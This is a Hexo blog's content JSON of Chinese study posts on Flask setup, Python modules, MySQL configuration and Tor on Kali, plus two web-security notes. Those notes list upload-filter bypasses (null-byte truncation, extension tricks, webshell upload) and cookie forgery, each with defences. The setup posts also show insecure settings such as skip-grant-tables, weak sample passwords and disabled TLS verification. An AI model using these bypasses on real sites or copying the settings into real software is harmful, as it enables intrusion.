{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[{"title":"关于","date":"2018-06-09T13:03:03.699Z","updated":"2018-06-09T13:03:03.699Z","comments":false,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"个人详细介绍 打工是不可能去打工的。"},{"title":"404 Not Found：该页无法显示","date":"2018-06-09T12:41:47.797Z","updated":"2018-06-09T12:41:47.797Z","comments":false,"path":"/404.html","permalink":"http://yoursite.com//404.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-09T13:02:37.610Z","updated":"2018-06-09T13:02:37.610Z","comments":true,"path":"links/index.html","permalink":"http://yoursite.com/links/index.html","excerpt":"","text":"google"},{"title":"书单","date":"2018-06-09T12:41:47.798Z","updated":"2018-06-09T12:41:47.798Z","comments":false,"path":"books/index.html","permalink":"http://yoursite.com/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-06-09T12:41:47.799Z","updated":"2018-06-09T12:41:47.799Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-06-09T13:05:43.876Z","updated":"2018-06-09T13:05:43.876Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"熟练各种编程语言的读法 擅长多门语言从入门到放弃 晚睡晚起打游戏 不喜欢回答问题"},{"title":"Repositories","date":"2018-06-09T12:41:47.799Z","updated":"2018-06-09T12:41:47.799Z","comments":false,"path":"repository/index.html","permalink":"http://yoursite.com/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"03-项目搭建","slug":"03-项目搭建","date":"2018-07-08T16:08:42.000Z","updated":"2018-07-08T16:08:59.951Z","comments":true,"path":"2018/07/09/03-项目搭建/","link":"","permalink":"http://yoursite.com/2018/07/09/03-项目搭建/","excerpt":"","text":"概述 这一节有以下要点 [ ] 项目分析 [ ] 项目目录 [ ] 安装基础插件及环境 [ ] 蓝图 [ ] 代码 项目分析 项目目录 安装基础插件及环境 123456cd micromoviepython -m venv venvsource .\\venv\\bin\\activatepip install flaskgit init git checkout -b day01 程序工程函数 如果全局创建程序，也就是123456789101112131415161718```#app/__init__.pyfrom flask import Flaskfrom config import Configurationdef create_app(config_name): app = Flask(__name__) app.config.from_object(Configuration[config_name]) from .frontend import index as index_blueprint app.register_blueprint(index_blueprint) from .backend import backoffice as backoffice_blueprint app.register_blueprint(backoffice_blueprint,url_prefix=&apos;/backoffice&apos;) return app 蓝图 12345678910# movie/frontend/__init__.pyfrom flask import Blueprintindex = Blueprint(&apos;index&apos;,__name__)from . import views# movie/backoffice/__init__.pyfrom flask import Blueprintbackoffice = Blueprint(&apos;backoffice&apos;,__name__)from . import views 注意点：注意包的引入格式。 代码： https://github.com/TheFifthMan/micromovie/tree/day01","categories":[{"name":"micro_movie","slug":"micro-movie","permalink":"http://yoursite.com/categories/micro-movie/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"python模块-requests","slug":"python模块-requests","date":"2018-07-08T15:32:50.000Z","updated":"2018-07-08T15:33:21.899Z","comments":true,"path":"2018/07/08/python模块-requests/","link":"","permalink":"http://yoursite.com/2018/07/08/python模块-requests/","excerpt":"","text":"概述 requests是python中热门的模块，它封装了python底层的库，并且更加容易使用。在python爬虫中非常常见的使用这个框架作为其请求的发送，这里记录其部分常见用法。 requests 安装 1pip install reqeusts 简单使用 POST请求 x-www-form-urlencode 12345data=&#123;&quot;xx&quot;:&quot;yy&quot;,&quot;aa&quot;:&quot;bb&quot;&#125;r = requests.post(&quot;http://www.posturl.com&quot;,data=data) json 12json=&quot;&#123;&apos;type&apos;:&apos;post&apos;,&apos;age&apos;:123&#125;&quot;r = requests.post(url,data=json) GET 1234headers=&#123;&quot;user-agent&quot;:&apos;xxxx&apos;,&#125;r=requests.get(url,headers=headers) 高级使用 有时候某些场景会出现SSL错误，我们需要禁用 1234from urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)requests.api.request(&apos;post&apos;, url, data=&#123;&apos;bar&apos;:&apos;baz&apos;&#125;, json=None, verify=False) 我们需要session来保持网站的连接 12session = requests.session()response = session.get(url) 上传文件模拟 12345&gt;&gt;&gt; url = &apos;http://httpbin.org/post&apos;&gt;&gt;&gt; files = &#123;&apos;file&apos;: (&apos;report.xls&apos;, open(&apos;report.xls&apos;, &apos;rb&apos;), &apos;application/vnd.ms-excel&apos;, &#123;&apos;Expires&apos;: &apos;0&apos;&#125;)&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text response.text 和 response.content 12text是正常的字符流content是二进制的字节流，常用于图片的传输 例子 结合unittest做API测试框架 12pip install html-testRunnerpip install requests 代码 1234567891011import HtmlTestRunnerimport unittestimport requestsclass TestPyRequest(unittest.TestCase): def setUp(self): self.url = 'https://api.douban.com' def test_douban_api(self): r = requests.get(self.url+'/v2/movie/top250',verify=False) self.assertTrue(r.status_code,200)if __name__ == '__main__': unittest.main(testRunner=HtmlTestRunner.HTMLTestRunner(output='.')) 以上我们就完成了一个以requests发送请求，以html-testRunner生成report，unittest作为验证断言的api框架，（以上代码只为简略的演示。） reference http://docs.python-requests.org/zh_CN/latest/","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"00-课程导学","slug":"00-课程导学","date":"2018-07-05T16:04:08.000Z","updated":"2018-07-05T16:05:00.951Z","comments":true,"path":"2018/07/06/00-课程导学/","link":"","permalink":"http://yoursite.com/2018/07/06/00-课程导学/","excerpt":"","text":"概述 这是一套来自慕课网的视频教程。记录一下学习过程。 框架知识 通过学习本课程，可学习到的知识 学会使用整型，浮点型，路径型，字符型正则表达式路由转换器 学会使用post和get请求，上传文件，cookie，获取和响应，404请求 学会使用模板自动转义，定义过滤器，定义全局上下文处理器，jinja2语法，包含，继承，定义宏 学会使用flask-wtf定义表单模型，字段类型，字段验证，视图处理表单，模板使用表单 学会使用flask-sqlalchemy定义数据库模型，提那家数据，修改数据，查询数据，删除数据，数据库事件，数据迁移 学会使用蓝图优化项目结构，实现微电影网站前台和后台的逻辑 学会flask的部署方法，安装编译nginx服务，安装编译python3服务，安装mysql服务，通过nginx反向代理对视频流媒体限制下载速率，限制单个IP能发起的播放连接数 微内核 werkzug工具箱 pymysql flask-sqlalchemy wtforms jinja2 flask-script functools定义高阶函数 视频技术 jwplayer播放器插件 视频限速限IP访问 flv,mp4视频格式支持 nginx点播实现","categories":[{"name":"micro_movie","slug":"micro-movie","permalink":"http://yoursite.com/categories/micro-movie/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"02-环境搭建","slug":"02-环境搭建","date":"2018-07-05T16:03:39.000Z","updated":"2018-07-05T16:05:41.824Z","comments":true,"path":"2018/07/06/02-环境搭建/","link":"","permalink":"http://yoursite.com/2018/07/06/02-环境搭建/","excerpt":"","text":"概述 windows环境搭建 mac环境搭建 mysql常规配置 windows搭建 0. 下载简介 1. 下载安装python3 2. 下载安装mysql 3. 下载安装pycharm 4. 指定python下载源 验证源： 5. 安装虚拟环境 1234mkdir microMoviecd microMoviepython -m venv venv .\\venv\\Scripts\\activate mac环境搭建 安装pyenv，用于python环境切换 123456brew install pyenv cd ~/.pyenvmkdir cachepyenv install 3.6.4pyenv global 3.6.4 pyenv refresh 指定python下载源 123456789mkdir ~/.pipcd ~/.pipvim pip.conf-----file content[global]trusted-host = mirrors.aliyun.comindex-url = http://mirrors.aliyun.com/pypi/simple----- 安装docker https://download.docker.com/mac/stable/Docker.dmg 使用docker安装mysql 12docker run --name mysql -p 3306:3306 -v /data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7docker exec -it /bin/bash mysql数据库配置 1. mysql修改密码 12345678910111213141516171、修改 /etc/my.cnf，在 [mysqld] 小节下添加一行：skip-grant-tables=1这一行配置让 mysqld 启动时不对密码进行验证2、重启 mysqld 服务：systemctl restart mysqld3、使用 root 用户登录到 mysql：mysql -u root 4、切换到mysql数据库，更新 user 表：update user set authentication_string = password(&apos;wzw011992&apos;), password_expired = &apos;N&apos;, password_last_changed = now() where user = &apos;wluser&apos;;在之前的版本中，密码字段的字段名是 password，5.7版本改为了 authentication_string5、退出 mysql，编辑 /etc/my.cnf 文件，删除 skip-grant-tables=1 的内容6、重启 mysqld 服务，再用新密码登录即可 2. 配置远程用户登录 12345grant all privileges on *(db name).* to &apos;username&apos;@&apos;%&apos; identified by &apos;qwe123&apos; with grant optionflush privileges;service mysqld restart 3. 创建本地用户 1234use awesome;grant select,insert,update,delete on awesome.* to &apos;john(user)&apos;@&apos;localhost&apos; identified by &apos;qwe123(password)&apos;;flush privileges; 4. 创建数据库 1create database `threatenReport` default character set utf8 collate utf8_general_ci; 5.错误： 61 ： 数据库没有开启远程访问的权限 12vim /etc/mysql/my.cnfbind-address :0.0.0.0 没有映射端口的话也会出错 1netstat -lnp | grep 3306 数据库连接 1mysql -h 127.0.0.1 -u root -p","categories":[{"name":"micro_movie","slug":"micro-movie","permalink":"http://yoursite.com/categories/micro-movie/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"01-项目分析","slug":"01-项目分析","date":"2018-07-05T16:03:30.000Z","updated":"2018-07-05T16:05:25.279Z","comments":true,"path":"2018/07/06/01-项目分析/","link":"","permalink":"http://yoursite.com/2018/07/06/01-项目分析/","excerpt":"","text":"概述 首先阐述一下我们要开发的微电影网站。功能还是比较强大的。一图胜前言 开发和生产环境 centos python3 mysql html5 flask nginx pycharm 框架对比","categories":[{"name":"micro_movie","slug":"micro-movie","permalink":"http://yoursite.com/categories/micro-movie/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://yoursite.com/tags/flask/"}]},{"title":"python模块-click","slug":"python模块-click","date":"2018-07-02T16:14:16.000Z","updated":"2018-07-02T16:14:31.773Z","comments":true,"path":"2018/07/03/python模块-click/","link":"","permalink":"http://yoursite.com/2018/07/03/python模块-click/","excerpt":"","text":"概述 我们有时候要实现命令行带参数去执行函数的时候，可以使用click模块去实现，简单方便。 click常用语法 基础用法 1234567import click@click.command()@click.option('--name','-name',default='johnw')def main(name): print(name) 设置一个参数多个值 其中多个值会被包装成一个tuple 12345import click @click.command()@click.option('--name',nargs=2,type='str')def main(name): print(name) 一个参数设置多个值，并且类型不同 1234567import click@click.command()@click.option('--ops',type=(unicode,int))def main(ops): print(ops) 问答型参数 123456import click@click.command()@click.option(&apos;--name&apos;,prompt=&quot;Your name is : &quot;)def main(name): print(&quot;Hello &quot;,name) 密码型参数 1234567import click@click.command()@click.option(&apos;--password&apos;,prompt=True,hide_input=True,confirmation_prompt=True)def encrypt(password): print(&apos;encrypted password&apos;) 几个参数 default：默认值 type： int,str,float help: 提示信息 reference http://click.pocoo.org/6/options/#basic-value-options","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块-queue","slug":"python模块-queue","date":"2018-07-01T15:29:19.000Z","updated":"2018-07-01T15:29:39.017Z","comments":true,"path":"2018/07/01/python模块-queue/","link":"","permalink":"http://yoursite.com/2018/07/01/python模块-queue/","excerpt":"","text":"概述 上次简单总结了python的多线程模块，这次主要学习一下python的queue模块，仔细通读下来，有两点 在queue模块中，如果你要执行put的操作的时候，如果是多线程，就会比较难办，因为这个时候数据是无序的，机器也没办法知道哪个已经放进去了，哪个还没放进去，会变得混乱 如果是把它拿出来执行，那就很方便，因为这个是在一个队列里面。 下面我们总结一下概念 queue queue实现了三种队列 FIFO： 先进先出 LIFO：后进先出 priority queue：优先值低的先出去，优先值相同的，先进先出 下面通过代码来学习一下队列多线程 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env python#-*- coding:utf-8 -*-from time import ctime,sleepimport threadingimport queue# 首先是先起一个队列q = queue.Queue()def work(i): while True: item = q.get() if item is None: print(\"线程 &#123;&#125; 发现了一个None， 可以休息了. time:&#123;&#125;\".format(i,ctime())) break sleep(0.5) # do some work print(\"线程&#123;&#125;将任务&lt;&#123;&#125;&gt;给完成了。time : &#123;&#125;\".format(i,item,ctime())) q.task_done()# 这里开始往队列里面放东西def producer(): for i in range(10): sleep(0.5) q.put(i) # 开始放，在这里就把需要的资源都放进去了。producer()# 起一个线程池work_threads = []# 其三个线程，加入线程池for i in range(3): work_threads.append(threading.Thread(target=work,args=(i,)))# 线程启动开始消耗for t in work_threads: t.start()# 阻塞队列，直到所有任务都完成了，在开始加入Noneq.join()# 加入None，以便完成任务for i in range(10): q.put(None) # 等待消耗的线程完成for t in work_threads: t.join() 总结 理解了多线程+queue，下一篇进行实战！ reference https://www.t00ls.net/articles-44516.html http://www.liujiangblog.com/course/python/59","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"常见的逻辑漏洞","slug":"常见的逻辑漏洞","date":"2018-06-30T15:52:44.000Z","updated":"2018-06-30T15:54:16.013Z","comments":true,"path":"2018/06/30/常见的逻辑漏洞/","link":"","permalink":"http://yoursite.com/2018/06/30/常见的逻辑漏洞/","excerpt":"","text":"逻辑安全存在的前提 有效的区分每个用户，并且针对每个用户提供独立的服务内容，允许用户与服务器进行大量的交互 。web应用的攻击就是攻击者从零交互零权限到最后取得最高权限。以下分别总结几点逻辑安全的漏洞 用户管理功能漏洞 Cookie and Session 最大的漏洞就是避免cookie伪造，例如在cookies中存在一个字段为 admin: false，这个时候，如果黑客将其改为 true，那么就可以实现cookies的一个伪造，从而进行攻击。 用户授权管理和安全分析 授权管理分为以下几个部分 注册 密码找回 登录 密码修改、绑定信息修改 管理权限 下面总结一下，大概有哪些危险 注册 面临的危险和解决方案 恶意重复注册 12345#解决方案限制IP注册频率表单加上验证码姓名和身份证验证二次验证，例如绑定手机号码或者邮箱 注册用户与已经存在的用户重名 123#解决方案首先数据库字段，要加上验证，不允许重复对用户输入要做校验。 没有对用户输入进行校验，造成xss，sql注入 1234#解决方案对用户输入要做校验.过滤特殊字符不使用sql拼接 mysql中，可能存在空格覆盖。 12#解决方案对用户输入要做校验,去除空格。 密码找回 面临的危险和解决方案 服务器没有校验修改密码的token，或者token是可猜测破解的，这回造成任意密码修改【!】。这个是存在最多的漏洞，很常见。 1加强token的安全性 session覆盖攻击,少见，即一个用户的session，会覆盖掉另一个用户的session，导致打开的时候，修改的其实是另一个用户的密码 1很少见，估计实现都有困难。 登录 面临的危险和解决方案 暴力破解用户密码 1使用验证码形式，用户三次输入错误，需要输入验证码，多次输入错误需要绑定的手机或者邮箱进行解锁 明文传输导致中间人攻击 12HTTPSHSTS 万能密码 1做好防止sql注入的漏洞 用户密码存储 1用户密码应该使用hash+随机盐的形式进行存储。 登录提示 1不应该使用过于明显的登录提示 密码修改/个人信息修改 CSRF攻击 1加CSRF token和 refer 进行防御 确认用户本人操作 1需要进行二次验证，确认是本人操作 管理权限漏洞 开发过程中没有对当前用户的一致性做校验工作。例如在flask中，个人中心需要登录才能看，但是如果你忘记了对当前用户的身份做一个校验，那么就会变成，只要随便登录一个用户，那么他就可以随便的修改或者查看他人的个人中心。 代码实例： 12345678910@app.route(&apos;/profile/&lt;username&gt;&apos;)@login_requireddef profile(username): user = User.query.filter_by(username=username).first() # 应该这么校验 if current_user == user: ... else: flash(&quot;You have no permission to access this page.&quot;) return redirect(url_for(&apos;index&apos;)) 权限管理没做好，导致低权限用户可以访问高权限用户的页面。同上，做好权限校验 用户身份识别和安全防护 这章主要讲的是验证码和二次验证码的安全，基本上可以概括为： 无论哪种验证码，都应该要有一个过期时间。 为了保证安全，都不该可以被猜测 总结 下一步打算认认真真研究一下kali这个系统了。","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-threading","slug":"python模块-threading","date":"2018-06-29T11:38:34.000Z","updated":"2018-06-29T11:39:44.326Z","comments":true,"path":"2018/06/29/python模块-threading/","link":"","permalink":"http://yoursite.com/2018/06/29/python模块-threading/","excerpt":"","text":"概述 众所周知，运行一个程序最重要的是它的执行效率，比如爬虫，要如何节省爬虫的时间，提高爬虫效率是一件很重要的事情。 虽然python的多线程是鸡肋，在任意时间内，只有一个python的解释器在解释python的bytecode。但也不是多线程就是没有用的，我们的代码分为两种，一种是计算密集型，一种是IO密集型，其中计算密集型主要是需要CPU进行大量的计算的，这个时候，python的多线程没什么用，反而可能会比单线程的效率差。而相对于IO密集型的代码，主要瓶颈在于网络的传输，硬盘IO之类的上面，这个时候，使用python多线程就可以提高其效率。 上面的理解可能稍显有些片面，但不管如何，偏底层的东西先做一个了解，先学会一下如何用python写多线程 threading.Thread 以一段代码为例，做一下学习 12345678910111213141516171819202122232425262728293031323334353637383940414243import threadingfrom time import ctime,sleepdef thread1(): for i in range(2): print(\"The thread name is &#123;&#125; and start in &#123;&#125;\".format(threading.current_thread().name,ctime())) sleep(1) print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))def thread2(): for i in range(2): print(\"The thread name is &#123;&#125; and start in &#123;&#125;\".format(threading.current_thread().name,ctime())) sleep(1) print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))if \"__main__\" == __name__: t1 = threading.Thread(target=thread1) t2 = threading.Thread(target=thread2) threads = [] threads.append(t1) threads.append(t2) for t in threads: print(t.daemon) t.start() print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))# result： 最后一个线程退出，用时两秒。'''FalseThe thread name is Thread-1 and start in Fri Jun 29 16:34:43 2018FalseThe thread name is Thread-2 and start in Fri Jun 29 16:34:43 2018The thread name is MainThread and end in Fri Jun 29 16:34:43 2018The thread name is Thread-2 and end in Fri Jun 29 16:34:44 2018The thread name is Thread-1 and end in Fri Jun 29 16:34:44 2018The thread name is Thread-2 and start in Fri Jun 29 16:34:44 2018The thread name is Thread-1 and start in Fri Jun 29 16:34:44 2018The thread name is Thread-2 and end in Fri Jun 29 16:34:45 2018The thread name is Thread-1 and end in Fri Jun 29 16:34:45 2018''' daemon属性 如果你设置一个线程的daemon属性为True的话，说明这个线程是不重要的，整个python的程序无需等待这个线程即可结束。 （注意，很多地方说是主线程结束，但是我实验了一下，主线程已经执行完了，但是其子线程还是会继续执行下去的。） 从代码可见，其daemon属性，从一开始就是False的。 但是如果你将daemon设置为True，那么程序将不会等待，主线程结束，程序就会退出，我们可以试着将代码改为 12345678910111213141516171819202122t1 = threading.Thread(target=thread1,daemon=True)t2 = threading.Thread(target=thread2,daemon=True)threads = []threads.append(t1)threads.append(t2)for t in threads: print(t.daemon) t.start()print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))# result'''TrueThe thread name is Thread-1 and start in Fri Jun 29 16:39:36 2018TrueThe thread name is Thread-2 and start in Fri Jun 29 16:39:36 2018The thread name is MainThread and end in Fri Jun 29 16:39:36 2018''' join方法 官方解释，join方法是用于阻塞线程的，一般要等待当前线程完成，才会进行下一个线程。根据实验，如果你对于每个线程都加一个join方法的话，那么就等于将程序变成了单线程，所以一般只给最后执行的子线程加一个join，这样，主线程就不会提前退出。 每个子线程都加join 1234for t in threads: print(t.daemon) t.start() t.join() 先启动,再遍历子线程加join 123456for t in threads: print(t.daemon) t.start()for t in threads: t.join() start方法 这个方法很直白，就是启动一个线程。 线程类 1234567891011121314151617181920212223242526272829303132333435import threadingfrom time import ctime,sleep# 引入多线程类# 只能重写两个方法，一个__init__ 一个是runclass MyThread(threading.Thread): def run(self): for i in range(2): print(\"The thread name is &#123;&#125; and start in &#123;&#125;\".format(threading.current_thread().name,ctime())) sleep(1) print(\"The thread name is &#123;&#125; and end in &#123;&#125;\".format(threading.current_thread().name,ctime()))if __name__ == \"__main__\": threads = [] for i in range(2): mt = MyThread() threads.append(mt) for t in threads: t.start() for t in threads: t.join()'''The thread name is Thread-1 and start in Fri Jun 29 17:04:41 2018The thread name is Thread-2 and start in Fri Jun 29 17:04:41 2018The thread name is Thread-1 and end in Fri Jun 29 17:04:42 2018The thread name is Thread-1 and start in Fri Jun 29 17:04:42 2018The thread name is Thread-2 and end in Fri Jun 29 17:04:42 2018The thread name is Thread-2 and start in Fri Jun 29 17:04:42 2018The thread name is Thread-1 and end in Fri Jun 29 17:04:43 2018The thread name is Thread-2 and end in Fri Jun 29 17:04:43 2018''' 总结 以上学习了python多线程的简单用法，实际中用法肯定比较复杂，比如说锁，比如说队列的多线程，还有待探索。","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块-logging","slug":"python模块-logging","date":"2018-06-29T11:36:55.000Z","updated":"2018-06-29T11:38:54.181Z","comments":true,"path":"2018/06/29/python模块-logging/","link":"","permalink":"http://yoursite.com/2018/06/29/python模块-logging/","excerpt":"","text":"工作流 理解log模块，首先应该理解其工作流，下面通过例子来说明其工作流 首先是main.py 123456789101112131415import subimport sub2import loggingimport logging.configfrom config import LOGGINGlogging.config.dictConfig(LOGGING)logger = logging.getLogger(&quot;main&quot;)def main(): sub.sub1() logger.error(&quot;main debug&quot;)if &quot;__main__&quot; == __name__: main() 在这里我们引入了sub 和sub2，先不理会其配置文件，假设已经写好配置文件了。 其次是sub.py 文件 12345import loggingsub_logger = logging.getLogger(&quot;main.sub&quot;)def sub1(): print(&quot;Hello This is sub1&quot;) sub_logger.debug(&quot;This is sub1&quot;) 我们可以看到，如果是多模块引入log机制，可以直接写成 如上面的形式。这种继承机制，让我们可以很方便的复用log. 理解配置文件 配置文件一般有两种： 字典形式 配置文件形式 至于哪种形式更好，就众说纷坛，有说字典形式比较好，因为都是python文件，我们写代码自定义程度更高，一种说配置文件形式其可读性更好。这里没有一个决断，我们首先使用字典形式，用代码来定义配置文件。 在配置文件里面，log有四个类，分别是 formatters handlers filters loggers formatters 首先我们来看一下formatters 12345678910&quot;formatters&quot;:&#123; # 标准模式 &quot;standard&quot;:&#123; &apos;format&apos;:&apos;[%(asctime)s][%(threadName)s:%(thread)d][%(name)s:%(levelname)s(%(lineno)d)]\\n[%(module)s:%(funcName)s]:%(message)s&apos; &#125; # 简单模式 &quot;brief&quot;:&#123; &quot;format&quot;:&apos;[%(message)s]&apos; &#125;&#125; 其中 standard 和 brief 都是我们可以自定义的名字 接下来我们看一下formatters的格式化字符串有哪些，并且分别是什么含义： 123456789101112131415%(name)s Logger的名字%(levelno)s 数字形式的日志级别%(levelname)s 文本形式的日志级别%(pathname)s 调用日志输出函数的模块的完整路径名，可能没有%(filename)s 调用日志输出函数的模块的文件名%(module)s 调用日志输出函数的模块名%(funcName)s 调用日志输出函数的函数名%(lineno)d 调用日志输出函数的语句所在的代码行%(created)f 当前时间，用UNIX标准的表示时间的浮 点数表示%(relativeCreated)d 输出日志信息时的，自Logger创建以 来的毫秒数%(asctime)s 字符串形式的当前时间。默认格式是 “2003-07-08 16:49:45,896”。逗号后面的是毫秒%(thread)d 线程ID。可能没有%(threadName)s 线程名。可能没有%(process)d 进程ID。可能没有%(message)s 用户输出的消息 handlers handlers模块，顾名思义，就是处理log的模块，在这里我们要定义，log的输出是文件形式还是命令行输出形式，文件形式的话，其文件的存储路径，文件大小改如何分割等问题 1234567891011121314151617&quot;handlers&quot;:&#123; &quot;console&quot;:&#123; &apos;level&apos;:&apos;DEBUG&apos;, #输出信息的最低级别 &apos;class&apos;:&apos;logging.StreamHandler&apos;, &apos;formatter&apos;:&apos;standard&apos;, #使用standard格式 &apos;filters&apos;: [&apos;require_debug_true&apos;,], #仅当 DEBUG = True 该处理器才生效,一般没用。 &#125;, &apos;log&apos;:&#123; &apos;level&apos;:&apos;DEBUG&apos;, &apos;class&apos;:&apos;logging.handlers.RotatingFileHandler&apos;, &apos;formatter&apos;:&apos;standard&apos;, &apos;filename&apos;:os.path.join(BASE_DIR, &apos;debug.log&apos;), #输出位置 &apos;maxBytes&apos;:1024*1024*5, #文件大小 5M &apos;backupCount&apos;: 5, #备份份数 &apos;encoding&apos;: &apos;utf8&apos;, #文件编码 &#125;,&#125; 同理，这里的console和log也是我们自定义的名字，我们还可以定义其他的，然后选择日志的输出位置，或者设置变量为日志的输出位置 loggers loggers是日志的全局管理器，我们会在这里定义一个管理器，在后面调用的时候，我们要获得这个管理器的名字。 123456789# 日志管理器集合 &apos;loggers&apos;:&#123; #管理器 &quot;main&quot;:&#123; &apos;handlers&apos;:[&apos;console&apos;, &apos;main_log&apos;], &apos;level&apos;:&apos;DEBUG&apos;, &apos;propagate&apos;:True, #是否传递给父记录器 &#125;, &#125; 其中 main 是我们自己定义的名字，需要注意的是，如果使用的logger没有在这里定义名字，那么这些配置将无用。 调用logger 这里其实也是前面有提到的东西，我们要引入logging和logging.config。（注意，不能只单纯引入logging，会报错） 在main.py中我们 这么引用 12345import loggingimport logging.configfrom config import LOGGINGlogging.config.dictConfig(LOGGING)logger = logging.getLogger(&quot;main&quot; 其中这个main 就是我们定义在配置文件中管理器的main 根据其工作流原理，其自模块也需要进行log记录，这个时候我们就不需要写配置文件了，直接使用这个配置文件即可 在sub.py中 12345import loggingsub_logger = logging.getLogger(&quot;main.sub&quot;)def sub1(): print(&quot;Hello This is sub1&quot;) sub_logger.debug(&quot;This is sub1&quot;) 总结 就这样，我们模拟了如何在python中使用日志记录，这对于开发来说是一件提高效率和产品质量很重要的事情 代码地址 https://github.com/TheFifthMan/python_modules reference http://yshblog.com/blog/125 https://segmentfault.com/a/1190000015143449","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"kali下使用Tor网络","slug":"kali下使用Tor网络","date":"2018-06-27T15:22:42.000Z","updated":"2018-06-27T15:26:17.616Z","comments":true,"path":"2018/06/27/kali下使用Tor网络/","link":"","permalink":"http://yoursite.com/2018/06/27/kali下使用Tor网络/","excerpt":"","text":"概述 记录一下如何在命令行下面使用tor网络 Kali下安装tor 1apt-get install tor 架梯子 1nohup sslocal -c ss.json 编辑tor配置,添加 12345678910cp /etc/tor/torrc /etc/tor/torrc.backupvim /etc/tor/torrc在里面添加...RunAsDaemon 1Socks5Proxy 127.0.0.1:1080# 重点，每隔n时间进行ip更换，时间单位为秒MaxCircuitDirtiness 900... 启动 1service tor@default start 问题 1234567891011121、创建一个用户，运行tor；2、编辑“start-tor-browser”文件，找到下面语句，删除或注释掉即可运行：#if [ “`id -u`” -eq 0 ]; then# complain “The Tor Browser Bundle should not be run as root. Exiting.”# exit 1#fi 关闭 1service tor@default stop 配置全局代理 1127.0.0.1:9050 总结 完成这一切的前提，是你有一个梯子… Reference https://evi1cg.me/archives/Tor_Fronting.html http://www.cnblogs.com/iamstudy/articles/tor_usage_in_pentest.html","categories":[{"name":"Linux_security","slug":"Linux-security","permalink":"http://yoursite.com/categories/Linux-security/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"文件上传漏洞-理论","slug":"文件上传漏洞-理论","date":"2018-06-25T16:09:00.000Z","updated":"2018-06-25T16:09:33.629Z","comments":true,"path":"2018/06/26/文件上传漏洞-理论/","link":"","permalink":"http://yoursite.com/2018/06/26/文件上传漏洞-理论/","excerpt":"","text":"概念 攻击者利用web应用对上传文件过滤不严的漏洞，将应用程序不该允许的文件类型上传到web服务器上，并成功解析。 文件上传攻击的前提 网站具有上传功能 上传的文件能够被web服务器解析并执行 知道上传后的文件路径和文件名称 目标文件可以呗用户访问 文件上传漏洞的攻与防 攻击 判断是否为js防护或者MIME防护 1使用burp suite抓取流量，进行伪造后重放攻击 针对黑名单过滤 1234561. 多次测试过滤文件名。例如php，php4，php52. 判断大小写绕过。Php，PHP3. 特殊文件名构造：php.shell. , php.shell_4. %00 截断。 phpshell.php%00.jpg5. 考虑web中间件版本漏洞。如httpd，tomcat，nginx,struts2等6. 如果web服务器是检测文件内容的，那么就可以使用修改文件头进行上传webshell 防御 前端进行js防御 [可绕过] 后端进行MIME防御 [可绕过] 后端进行白名单防御 只允许相应格式的文件进行上传，其余格式的文件丢弃 后端黑名单过滤 [可绕过] 不允许相应格式的文件进行上传 文件重命名防御 将用户上传的文件进行重命名，防止截断和绕过 文件名不该含有特殊符号，防止xss之类的攻击 文件内容检测。[可绕过] 有些图像文件，如果以网页脚本形式进行展示的话，那么就可能执行木马。针对文件内容进行检测，必要时候可以使用图像二次渲染之类的技术进行防护。 文件名长度需要做限制 需要有三个文件夹，一个存放临时文件，一个存放正式文件，一个存放病毒文件，并且其上传的文件都不应该具有x权限 